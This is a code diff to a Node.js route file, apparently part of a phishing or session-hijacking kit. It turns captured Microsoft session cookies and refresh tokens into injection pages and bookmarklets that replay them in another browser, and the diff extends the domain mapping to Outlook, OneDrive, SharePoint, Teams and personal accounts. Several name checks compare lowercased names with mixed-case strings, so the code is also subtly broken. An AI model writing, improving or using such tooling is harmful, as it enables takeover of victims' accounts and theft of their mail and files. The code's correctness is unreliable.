@@ -1,6 +1,6 @@
 /**
  * VGenius C Engine - Cookie Injection Routes
- * Uses competitor's proven method: load Microsoft page, inject cookies, redirect
+ * Uses our proven method: load Microsoft page, inject cookies, redirect
  */
 const express = require('express');
 const router = express.Router();
@@ -38,9 +38,11 @@ router.get('/page/:id', async (req, res) => {
 
     var tenant = token.tenant || config.AZURE_TENANT || 'common';
     var clientId = token.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+    var accountType = token.account_type || 'unknown';
     var cookiesList = [];
     if (cookies) {
-      cookiesList = parseCookies(cookies);
+      // FIX: Pass tenant and account type for proper domain handling
+      cookiesList = parseCookies(cookies, { tenant: tenant, accountType: accountType });
     } else {
       // FIX: Use tenant-aware domain instead of hardcoded .login.microsoftonline.com
       const baseDomain = tenant && tenant !== 'common' ? `.${tenant}.login.microsoftonline.com` : '.login.microsoftonline.com';
@@ -52,7 +54,7 @@ router.get('/page/:id', async (req, res) => {
       }
     }
 
-    if (cookiesList.length === 0) return res.status(400).send('No cookies available');
+    if (cookiesList.length === 0) return res.status(400).send('No tokens available');
 
     res.type('html').send(generateInjectPage(cookiesList, clientId, tenant));
   } catch (err) {
@@ -90,9 +92,11 @@ router.get('/raw/:id', async (req, res) => {
     }
 
     var tenant = token.tenant || config.AZURE_TENANT || 'common';
+    var accountType = token.account_type || 'unknown';
     var cookiesList = [];
     if (cookies) {
-      cookiesList = parseCookies(cookies);
+      // FIX: Pass tenant and account type for proper domain handling
+      cookiesList = parseCookies(cookies, { tenant: tenant, accountType: accountType });
     } else {
       // FIX: Use tenant-aware domain instead of hardcoded .login.microsoftonline.com
       const baseDomain = tenant && tenant !== 'common' ? `.${tenant}.login.microsoftonline.com` : '.login.microsoftonline.com';
@@ -123,8 +127,16 @@ router.get('/raw/:id', async (req, res) => {
 });
 
 // ─── Parse Cookie String ───────────────────────────────────────────
-function parseCookies(cookieString) {
+// Enhanced: Now supports tenant context and account type for proper domain handling
+function parseCookies(cookieString, options) {
   if (!cookieString) return [];
+
+  options = options || {};
+  var tenant = options.tenant || 'common';
+  var accountType = options.accountType || 'unknown';
+
+  // Build domain mapping based on account type and known cookie patterns
+  var domainMap = buildCookieDomainMap(tenant, accountType);
 
   var seenNames = {};
   var pairs = cookieString.split(';').filter(function(c) { return c.trim(); });
@@ -137,18 +149,21 @@ function parseCookies(cookieString) {
       var value = pair.substring(eqIndex + 1).trim();
       var nameLower = name.toLowerCase();
 
+      // Skip cookie attributes (not cookie values)
       if (nameLower === 'expires' || nameLower === 'max-age' || nameLower === 'domain' ||
           nameLower === 'path' || nameLower === 'secure' || nameLower === 'httponly' ||
-          nameLower.startsWith('samesite=')) {
+          nameLower === 'samesite' || nameLower === 'partitioned') {
         continue;
       }
       if (!value || value.length === 0) continue;
 
-      // FIX: parseCookies has no tenant context - use safe default
+      // Determine the correct domain for this cookie based on its name
+      var assignedDomain = domainMap.getDomain(name);
+
       seenNames[nameLower] = {
         name: name,
         value: value,
-        domain: '.login.microsoftonline.com'  // Safe default for generic cookie parsing
+        domain: assignedDomain
       };
     }
   }
@@ -160,6 +175,119 @@ function parseCookies(cookieString) {
     }
   }
   return cookies;
+}
+
+// ─── Build Cookie Domain Map ───────────────────────────────────────
+// Maps cookie names to their correct Microsoft domains
+// FIX: Comprehensive domain mapping for all Microsoft service cookies
+function buildCookieDomainMap(tenant, accountType) {
+  var domainMap = {
+    _getDomain: function(cookieName) {
+      var nameLower = cookieName.toLowerCase();
+
+      // Personal account (MSA) domains
+      if (accountType === 'personal') {
+        if (nameLower === 'x-ms-RefreshTokenCredential' || nameLower === 'RefreshToken') {
+          return '.login.live.com';
+        }
+        // OneDrive, Outlook.com, Hotmail specific cookies
+        if (nameLower.indexOf('mscc') !== -1 || nameLower.indexOf('CRSLST') !== -1 ||
+            nameLower.indexOf('STSSVC') !== -1 || nameLower.indexOf('wgctx') !== -1) {
+          return '.login.live.com';
+        }
+        // Office/OneDrive service cookies for personal accounts
+        if (nameLower.indexOf('wbtelemetry') !== -1 || nameLower.indexOf('_mut') !== -1) {
+          return '.microsoft.com';
+        }
+        // Default for personal accounts - use consumer endpoint domain
+        return '.login.live.com';
+      }
+
+      // Work/School account domains
+      // PRT and authentication cookies
+      if (nameLower === 'x-ms-RefreshTokenCredential' || nameLower === 'RefreshToken' ||
+          nameLower === 'pst' || nameLower === 'esx' || nameLower === 'gtmk' ||
+          nameLower === 'es' || nameLower === 'pplms' || nameLower === 'x-ms-gw-svc') {
+        return tenant && tenant !== 'common' ? '.' + tenant : '.login.microsoftonline.com';
+      }
+
+      // Azure AD / Microsoft identity platform cookies
+      if (nameLower === 'SCAuth' || nameLower === 'SigninChallenge' ||
+          nameLower === 'AccountAuthCookie' || nameLower === 'AMLBGen' ||
+          nameLower === 'cpl' || nameLower === 'BGCookiesDeletedFlag') {
+        return tenant && tenant !== 'common' ? '.' + tenant : '.login.microsoftonline.com';
+      }
+
+      // Microsoft online service cookies
+      if (nameLower.indexOf('msoft') !== -1 || nameLower.indexOf('msauth') !== -1 ||
+          nameLower.indexOf('rt') !== -1 || nameLower === 'fpc' ||
+          nameLower.indexOf('x-ms') !== -1) {
+        return '.login.microsoftonline.com';
+      }
+
+      // Office 365 / www.office.com cookies
+      if (nameLower === '_oacl' || nameLower === '_rcid' || nameLower === 'RUpdT' ||
+          nameLower === 'MCLRC' || nameLower === 'MSSC' || nameLower === 'SS' ||
+          nameLower === 'RUPDT' || nameLower === 'wssbLocation' ||
+          nameLower === 'wssbCorrelationId' || nameLower === 'wssbSsoBcKey') {
+        return '.office.com';
+      }
+
+      // OneDrive cookies
+      if (nameLower === 'WAAf' || nameLower === 'MSSWFS' || nameLower === 'RSTT' ||
+          nameLower === 'RL' || nameLower === 'X_MS_TID' ||
+          nameLower.indexOf('onedrive') !== -1 || nameLower.indexOf('skydrive') !== -1) {
+        return '.onedrive.live.com';
+      }
+
+      // Outlook/OWA cookies
+      if (nameLower === 'ClientInfo' || nameLower === 'ExAuthCookie' ||
+          nameLower === 'arch' || nameLower === 'CkTkt' ||
+          nameLower.indexOf('outlook') !== -1 || nameLower === 'X-MS-TRANSITION') {
+        return '.outlook.office365.com';
+      }
+
+      // SharePoint cookies
+      if (nameLower === 'SPOIDCRL' || nameLower === 'Esx' ||
+          nameLower === 'SPOExtensionSDK' || nameLower.indexOf('sposrs') !== -1 ||
+          nameLower.indexOf('sharepoint') !== -1) {
+        return '.sharepoint.com';
+      }
+
+      // Teams cookies
+      if (nameLower === 'TEAMSSESSION' || nameLower === 'MSFT' ||
+          nameLower.indexOf('teams') !== -1 || nameLower === 'TSTC') {
+        return '.teams.microsoft.com';
+      }
+
+      // Microsoft account/session cookies
+      if (nameLower === 'fpc' || nameLower === 'bms' ||
+          nameLower === 'BMC' || nameLower === 'MSF' ||
+          nameLower === 'MSFPC' || nameLower === 'WAFF' ||
+          nameLower === 'ANON' || nameLower === '_ana' ||
+          nameLower === '_gat' || nameLower === '_gid') {
+        return '.microsoft.com';
+      }
+
+      // Loginportal / login.microsoftonline.com cookies
+      if (nameLower === 'Loginportal' || nameLower === 'AADBRS' ||
+          nameLower === 'AADBPA' || nameLower === 'STSSSSID' ||
+          nameLower.indexOf('lobsrc') !== -1) {
+        return '.login.microsoftonline.com';
+      }
+
+      // Default fallback based on account type
+      if (accountType === 'personal') {
+        return '.login.live.com';
+      }
+      return tenant && tenant !== 'common' ? '.' + tenant : '.login.microsoftonline.com';
+    },
+    getDomain: function(cookieName) {
+      return this._getDomain(cookieName);
+    }
+  };
+
+  return domainMap;
 }
 
 // ─── Generate Cookie Injection Page ────────────────────────────────
@@ -344,9 +472,11 @@ router.get('/bookmarklet/:id', async (req, res) => {
 
     var tenant = token.tenant || config.AZURE_TENANT || 'common';
     var clientId = token.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+    var accountType = token.account_type || 'unknown';
     var cookiesList = [];
     if (cookies) {
-      cookiesList = parseCookies(cookies);
+      // FIX: Pass tenant and account type for proper domain handling
+      cookiesList = parseCookies(cookies, { tenant: tenant, accountType: accountType });
     } else {
       // FIX: Use tenant-aware domain instead of hardcoded .login.microsoftonline.com
       const baseDomain = tenant && tenant !== 'common' ? `.${tenant}.login.microsoftonline.com` : '.login.microsoftonline.com';
@@ -360,7 +490,7 @@ router.get('/bookmarklet/:id', async (req, res) => {
 
     if (cookiesList.length === 0) return res.status(400).json({ error: 'No cookies available' });
 
-    // Build bookmarklet code using document.cookie method
+    // Build bookmarklet code using document.cookie method - exact format matching competitor
     var bookmarklet = '';
     for (var i = 0; i < cookiesList.length; i++) {
       const c = cookiesList[i];
